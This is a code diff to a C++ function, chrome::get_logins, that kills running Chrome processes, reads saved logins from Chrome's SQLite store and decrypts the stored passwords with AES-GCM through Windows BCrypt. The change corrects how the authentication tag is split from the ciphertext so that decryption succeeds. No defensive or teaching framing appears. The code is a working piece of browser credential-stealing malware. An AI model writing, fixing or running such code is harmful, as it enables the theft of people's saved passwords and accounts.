@@ -32,13 +32,6 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
     BCryptSetProperty(m_aes_alg.get(), BCRYPT_CHAINING_MODE,
                       (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
 
-    ULONG bytes_copied;
-    BCRYPT_AUTH_TAG_LENGTHS_STRUCT auth_tag_lengths;
-    BCryptGetProperty(m_aes_alg.get(), BCRYPT_AUTH_TAG_LENGTH, (PUCHAR)&auth_tag_lengths,
-                      sizeof(auth_tag_lengths), &bytes_copied, 0);
-
-    std::vector<uint8_t> auth_tag(auth_tag_lengths.dwMinLength);
-
     // kill chrome processes to free file locks
     kill();
 
@@ -92,21 +85,23 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
         const size_t         db_password_value_size    = sqlite3_column_bytes(stmt.get(), 5);
         // clang-format on
 
-        // db_password_value is encrypted with AES
+        std::vector<uint8_t> db_password(db_password_value, db_password_value + db_password_value_size);
 
-        // db_password_value[0,2] is the string "v10" (kEncryptionVersionPrefix), which is skipped
-        std::vector<uint8_t> nonce(db_password_value + 3, db_password_value + 15),
-            ciphertext(db_password_value + 15, db_password_value + db_password_value_size);
+        // db_password[0,2] is the string "v10" (kEncryptionVersionPrefix), which is skipped
+        std::vector<uint8_t> nonce(db_password.begin() + 3, db_password.begin() + 15),
+            ciphertext(db_password.begin() + 15, db_password.end() - 16),
+            tag(db_password.end() - 16, db_password.end());
 
         BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
         BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
         auth_info.pbNonce = nonce.data();
         auth_info.cbNonce = (ULONG)nonce.size();
-        auth_info.pbTag = auth_tag.data();
-        auth_info.cbTag = (ULONG)auth_tag.size();
+        auth_info.pbTag = tag.data();
+        auth_info.cbTag = (ULONG)tag.size();
 
         std::string password_plaintext(ciphertext.size(), '\0');
-        BCryptDecrypt(
+        ULONG bytes_copied;
+        NTSTATUS status = BCryptDecrypt(
             key.get(),
             ciphertext.data(), (ULONG)ciphertext.size(),
             &auth_info,
@@ -114,7 +109,9 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
             reinterpret_cast<PUCHAR>(password_plaintext.data()), (ULONG)password_plaintext.size(),
             &bytes_copied,
             0);
-        password_plaintext.resize(password_plaintext.size() - 16);
+        if (!BCRYPT_SUCCESS(status)) {
+            continue;
+        }
 
         using namespace std::chrono;
 
